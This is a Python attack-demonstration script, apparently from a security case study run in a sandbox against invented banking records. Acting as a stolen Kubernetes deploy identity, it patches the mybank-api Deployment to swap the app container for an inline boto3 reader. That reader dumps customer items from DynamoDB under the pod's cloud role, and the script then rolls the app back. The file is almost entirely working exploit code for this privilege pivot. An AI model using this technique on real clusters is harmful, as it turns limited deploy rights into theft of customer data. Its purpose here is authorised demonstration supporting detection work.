"""Prove the impact of the stolen deploy identity: it reaches synthetic customer data.

Authorized case-study demonstration in our own sandbox against invented records. This runs the
post-credential steps of the documented attack (concept steps 22-24): the deploy identity can
only `patch` the mybank-api Deployment, but the pod runs under the app's service account, whose
EKS Pod Identity role can read the customer tables. So replacing the app's container command with
a reader turns deploy access into data access. It restores the app afterward and never sends data
anywhere outside the cluster.

Run detection OFF (`scripts.demo.prevent off`) so this mirrors a successful attack. The network
caveat is real and worth stating to a panel: a GitHub-hosted PR runner cannot reach the private
cluster, so these steps run from an in-VPC position, representing an attacker whose pipeline
deploys with cluster access (a common real pattern). The credential grab itself is what the
detector catches first; this shows why catching it matters.
"""

import json
import subprocess
import time

from scripts.demo.kube import admin_kubectl
from scripts.demo.ops import activate, exe, outputs, step

DEPLOYER = ["--as=mybank-deployer", "--as-group=mybank:deployers"]
# Reader code for the hijacked container: no single quotes (it is shell single-quoted below).
READER = (
    "import boto3,os,json;"
    'c=boto3.client("dynamodb",region_name=os.environ.get("AWS_REGION","us-east-1"));'
    'print("STOLEN SYNTHETIC CUSTOMER RECORDS:");'
    '[print(json.dumps(c.get_item(TableName=os.environ["ACCOUNTS_TABLE"],'
    'Key={"account_id":{"S":a}}).get("Item"))) for a in ("acct-alice","acct-bob")];'
    '[print(json.dumps(c.get_item(TableName=os.environ["CUSTOMERS_TABLE"],'
    'Key={"customer_id":{"S":u}}).get("Item"))) for u in ("cust-alice","cust-bob")];'
    'print("---END---")'
)


def kctl(kubectl, *args, check=True, as_deployer=False, capture=True):
    command = [exe(kubectl[0]), *kubectl[1:], "-n", "mybank", *(DEPLOYER if as_deployer else []),
               *args]
    return subprocess.run(command, check=check, text=True,
                          capture_output=capture).stdout if capture else subprocess.run(
                              command, check=check)


def main():
    activate()
    values = outputs()
    with admin_kubectl(values) as kubectl:
        step("1. Confirm the stolen identity's scope (acting only as mybank:deployers)")
        for verb, target in (("patch", "deployment/mybank-api"), ("get", "secret/mybank-api"),
                             ("create", "pods")):
            allowed = kctl(kubectl, "auth", "can-i", verb, target, as_deployer=True,
                           check=False).strip()
            print(f"    can-i {verb} {target}: {allowed}")

        original = kctl(kubectl, "get", "deployment", "mybank-api",
                        "-o", "jsonpath={.spec.template.spec.containers[0].image}").strip()
        step("2. Abuse deploy access: replace the app container with a data reader")
        patch = {"spec": {"template": {"spec": {"containers": [{
            "name": "api", "command": ["sh", "-c", f"python -c '{READER}'; sleep 3600"],
            "livenessProbe": None, "readinessProbe": None, "startupProbe": None,
        }]}}}}
        kctl(kubectl, "patch", "deployment", "mybank-api", "--type=strategic",
             "-p", json.dumps(patch), as_deployer=True)
        print("    patched as mybank:deployers (no admin rights, no secret access)")

        step("3. The hijacked pod runs under the app identity and reads the customer tables")
        records = wait_for_records(kubectl)
        print(records or "    (no output captured yet; re-run kubectl logs)")

        step("4. Restore the legitimate app (as the operator, not the attacker)")
        kctl(kubectl, "rollout", "undo", "deployment/mybank-api", capture=False)
        kctl(kubectl, "rollout", "status", "deployment/mybank-api", "--timeout=180s", capture=False)
        print(f"    app restored to {original.split('@')[0]}@...")
    step("Impact shown: deploy identity -> app identity -> synthetic customer data. "
         "Detection catches the grab before this stage.")


def wait_for_records(kubectl) -> str:
    deadline = time.monotonic() + 180
    while time.monotonic() < deadline:
        time.sleep(10)
        logs = kctl(kubectl, "logs", "-l", "app.kubernetes.io/name=mybank-api",
                    "--tail=20", check=False)
        if "STOLEN SYNTHETIC CUSTOMER RECORDS" in logs:
            lines = logs.splitlines()
            start = next(i for i, line in enumerate(lines) if "STOLEN" in line)
            return "\n".join("    " + line for line in lines[start:])
    return ""


if __name__ == "__main__":
    main()
